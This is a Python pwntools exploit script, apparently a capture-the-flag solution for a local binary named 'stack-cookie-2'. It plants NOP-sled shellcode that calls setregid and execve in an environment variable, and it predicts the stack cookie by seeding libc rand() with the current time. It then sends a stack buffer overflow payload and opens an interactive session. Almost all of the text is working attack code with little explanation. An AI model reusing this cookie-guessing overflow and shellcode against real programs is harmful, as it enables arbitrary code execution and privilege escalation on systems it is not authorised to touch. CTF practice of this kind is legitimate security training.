
#!/usr/bin/env python
from ctypes import CDLL
import math
from pwn import *
import os
#context.terminal = ['tmux', 'splitw', '-h']

env = {'SHELLCODE' : '\x90' * 50 + '\xb83\x01\x01\x01-\x01\x01\x01\x01\xcd\x80\x89\xc3\x89\xc1\xb8H\x01\x01\x01-\x01\x01\x01\x01\xcd\x801\xc9QjA\x89\xe31\xd2\xb8\x0c\x01\x01\x01-\x01\x01\x01\x01\xcd\x80'}

#[ret]
#[ebp]
#[ebp-4]
#
#...
#
#[ebp-88]

#libc rand() immitator: http://ctfhacker.com/ctf/pwnable/2015/09/07/mmactf-moneygame.html

libc = CDLL('libc.so.6')

# Seed srand with time(0)
now = int(math.floor(time.time()))
libc.srand(now)

test_cookie = libc.rand()
p = process('stack-cookie-2', env=env)

#gdb.attach(p, 'b*main')
p.read()
print("--> Randon Guessed to be: " + str(test_cookie))

p.sendline("A" * (0x84) + p32(test_cookie) + "B" * 1000)
p.interactive()
